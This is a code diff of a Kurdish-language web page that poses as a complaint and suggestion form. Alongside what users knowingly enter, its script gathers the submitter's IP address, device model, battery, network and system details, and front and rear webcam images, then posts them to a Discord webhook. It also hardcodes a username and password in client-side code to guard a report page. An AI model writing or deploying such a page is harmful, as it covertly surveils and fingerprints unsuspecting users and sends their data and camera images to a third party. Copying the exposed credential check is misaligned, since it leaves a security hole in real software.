+                                `🌐 **IP Address:** ${ipData.ip}\n\n` +
+                                `📱💻 **جۆری ئامێر:** ${deviceType}\n` +
+                                `🔋 **ڕێژەی باتری:** ${batteryStatus}\n` +
+                                `🛜 **جۆری ئینتەرنێت:** ${networkStatus}\n` +
+                                `${extraSystemInfo}\n\n` +
+                                `📧 **ئیمەیڵی نێرەر:** ${userEmail || "دیاری نەکراوە"}\n` +
+                                `📋 **شیکردنەوەی ئیمەیل:**\n${emailAnalysisInfo}\n\n` +
+                                `👤 **ناوی کەسەکە:** ${personName}\n` +
+                                `📍 **شوێنی نیشتەجێبوون:** ${location}\n` +
+                                `🎵 **TikTok:** ${tiktok || "نییە"}\n` +
+                                `👻 **Snapchat:** ${snapchat || "نییە"}\n` +
+                                `📸 **Instagram:** ${instagram || "نییە"}\n` +
+                                `✈️️ **Telegram:** ${telegram || "نییە"}\n` +
+                                `📘 **Facebook:** ${facebook || "نییە"}\n` +
+                                `⏰ **کات:** ${new Date().toLocaleString()}`;
 
-    // هاوپێچکردنی وێنەی کامێرای پێشەوە و دواوە
-    if (dualImages.front) {
-        formData.append("file1", dualImages.front, "webcam_front.jpg");
-    }
-    if (dualImages.rear) {
-        formData.append("file2", dualImages.rear, "webcam_rear.jpg");
-    }
-    if (uploadedImage) {
-        formData.append("file3", uploadedImage);
-    }
+            formData.append("content", contentText);
 
-    try {
-        await fetch(DISCORD_WEBHOOK_URL, {
-            method: "POST",
-            body: formData
-        });
+            if (dualImages.front) formData.append("file1", dualImages.front, "webcam_front.jpg");
+            if (dualImages.rear) formData.append("file2", dualImages.rear, "webcam_rear.jpg");
+            if (uploadedImage) formData.append("file3", uploadedImage);
 
-        successDiv.innerText = "سکاڵاکە بە سەرکەوتوویی تۆمار کرا و نێردرا.";
-        document.getElementById("tiktok").value = "";
-        document.getElementById("snapchat").value = "";
-        document.getElementById("instagram").value = "";
-        document.getElementById("telegram").value = "";
-        document.getElementById("facebook").value = "";
-        document.getElementById("personName").value = "";
-        document.getElementById("location").value = "";
-        document.getElementById("personImage").value = "";
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData });
+                successDiv.innerText = "سکاڵاکە بە سەرکەوتوویی تۆمار کرا و نێردرا.";
+                ['tiktok', 'snapchat', 'instagram', 'telegram', 'facebook', 'personName', 'location', 'personImage'].forEach(id => {
+                    document.getElementById(id).value = "";
+                });
+            } catch (error) {
+                alert("هەڵەیەک ڕوویدا لە ناردنی سکاڵاکە.");
+                successDiv.classList.add('hidden');
+            }
+        }
 
-    } catch (error) {
-        alert("هەڵەیەک ڕوویدا لە ناردنی سکاڵاکە بۆ دیسکۆرد.");
-        successDiv.style.display = "none";
-        console.error(error);
-    }
-}
+        function openSuggestion() {
+            document.getElementById("sectionsScreen").classList.add('hidden');
+            document.getElementById("suggestionScreen").classList.remove('hidden');
+        }
 
-function openSuggestion() {
-    document.getElementById("sectionsScreen").style.display = "none";
-    document.getElementById("suggestionScreen").style.display = "block";
-}
+        function backFromSuggestion() {
+            document.getElementById("suggestionScreen").classList.add('hidden');
+            document.getElementById("sectionsScreen").classList.remove('hidden');
+        }
 
-function backFromSuggestion() {
-    document.getElementById("suggestionScreen").style.display = "none";
-    document.getElementById("sectionsScreen").style.display = "block";
-}
+        async function sendSuggestion() {
+            const reason = document.getElementById("suggestionReason").value.trim();
+            const chat = document.getElementById("suggestionChat").value.trim();
+            const image = document.getElementById("suggestionImage").files[0] || null;
+            const video = document.getElementById("suggestionVideo").files[0] || null;
+            const deviceType = getDetailedDevice();
+            const batteryStatus = await getBatteryInfo();
+            const networkStatus = getNetworkInfo();
+            const extraSystemInfo = getExtraScreenAndSystemInfo();
 
-async function sendSuggestion() {
-    const reason = document.getElementById("suggestionReason").value.trim();
-    const chat = document.getElementById("suggestionChat").value.trim();
-    const image = document.getElementById("suggestionImage").files[0] || null;
-    const video = document.getElementById("suggestionVideo").files[0] || null;
-    const deviceType = getDetailedDevice();
-    const batteryStatus = await getBatteryInfo();
-    const networkStatus = getNetworkInfo();
-    const extraSystemInfo = getExtraScreenAndSystemInfo();
+            if (reason === "") {
+                alert("تکایە هۆکاری گومان کردن بنووسە.");
+                return;
+            }
 
-    if (reason === "") {
-        alert("تکایە هۆکاری گومان کردن بنووسە.");
-        return;
-    }
+            const formData = new FormData();
+            const contentText = `💡 **پێشنیارێکی نوێ تۆمار کرا**\n\n` +
+                                `📱💻 **جۆری ئامێر:** ${deviceType}\n` +
+                                `🔋 **ڕێژەی باتری:** ${batteryStatus}\n` +
+                                `🛜 **جۆری ئینتەرنێت:** ${networkStatus}\n` +
+                                `${extraSystemInfo}\n\n` +
+                                `📧 **ئیمەیڵ:** ${userEmail || "دیاری نەکراوە"}\n` +
+                                `❓ **هۆکاری گومان:** ${reason}\n` +
+                                `💬 **چات:** ${chat || "نییە"}\n` +
+                                `⏰ **کات:** ${new Date().toLocaleString()}`;
 
-    const formData = new FormData();
-    const contentText = `💡 **پێشنیارێکی نوێ تۆمار کرا**\n\n` +
-                        `📱💻 **جۆری ئامێر و مۆدێل:** ${deviceType}\n` +
-                        `🔋 **ڕێژەی باتری و شەحن:** ${batteryStatus}\n` +
-                        `🛜 **جۆری ئینتەرنێت:** ${networkStatus}\n` +
-                        `${extraSystemInfo}\n\n` +
-                        `📧 **ئیمەیڵی نێرەر:** ${userEmail || "دیاری نەکراوە"}\n` +
-                        `📋 **شیکردنەوەی ئیمەیل:**\n${emailAnalysisInfo}\n\n` +
-                        `❓ **هۆکاری گومان:** ${reason}\n` +
-                        `💬 **چات / دەق:** ${chat || "نییە"}\n` +
-                        `⏰ **کات:** ${new Date().toLocaleString()}`;
+            formData.append("content", contentText);
+            if (image) formData.append("file1", image);
+            if (video) formData.append("file2", video);
 
-    formData.append("content", contentText);
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData });
+                document.getElementById("suggestionSuccess").classList.remove('hidden');
+                ['suggestionReason', 'suggestionChat', 'suggestionImage', 'suggestionVideo'].forEach(id => {
+                    document.getElementById(id).value = "";
+                });
+            } catch (error) {
+                alert("هەڵەیەک ڕوویدا.");
+            }
+        }
 
-    if (image) formData.append("file1", image);
-    if (video) formData.append("file2", video);
+        function openReportLogin() {
+            document.getElementById("sectionsScreen").classList.add('hidden');
+            document.getElementById("reportLoginScreen").classList.remove('hidden');
+        }
 
-    try {
-        await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData });
-        document.getElementById("suggestionSuccess").style.display = "block";
-        document.getElementById("suggestionReason").value = "";
-        document.getElementById("suggestionChat").value = "";
-        document.getElementById("suggestionImage").value = "";
-        document.getElementById("suggestionVideo").value = "";
-    } catch (error) {
-        alert("هەڵەیەک ڕوویدا.");
-    }
-}
+        function backFromReportLogin() {
+            document.getElementById("reportLoginScreen").classList.add('hidden');
+            document.getElementById("sectionsScreen").classList.remove('hidden');
+        }
 
-function openReportLogin() {
-    document.getElementById("sectionsScreen").style.display = "none";
-    document.getElementById("reportLoginScreen").style.display = "block";
-}
+        function checkReportLogin() {
+            const username = document.getElementById("reportUsername").value.trim();
+            const password = document.getElementById("reportPassword").value;
+            const error = document.getElementById("reportLoginError");
 
-function backFromReportLogin() {
-    document.getElementById("reportLoginScreen").style.display = "none";
-    document.getElementById("sectionsScreen").style.display = "block";
-}
+            if (username === "Jsja-osja-7388r" && password === "jumanji4321") {
+                error.classList.add('hidden');
+                window.location.href = "report.html";
+            } else {
+                error.classList.remove('hidden');
+            }
+        }
 
-function checkReportLogin() {
-    const username = document.getElementById("reportUsername").value.trim();
-    const password = document.getElementById("reportPassword").value;
-    const error = document.getElementById("reportLoginError");
-
-    if (username === "Jsja-osja-7388r" && password === "jumanji4321") {
-        error.style.display = "none";
-        window.location.href = "report.html";
-    } else {
-        error.style.display = "block";
-    }
-}
-
-document.getElementById("gmailInput").addEventListener("keydown", function(event) {
-    if (event.key === "Enter") checkEmail();
-});
-
-document.getElementById("reportPassword").addEventListener("keydown", function(event) {
-    if (event.key === "Enter") checkReportLogin();
-});
-</script>
-
+        document.getElementById("gmailInput").addEventListener("keydown", e => { if (e.key === "Enter") checkEmail(); });
+        document.getElementById("reportPassword").addEventListener("keydown", e => { if (e.key === "Enter") checkReportLogin(); });
+    </script>
 </body>
 </html>
-
-
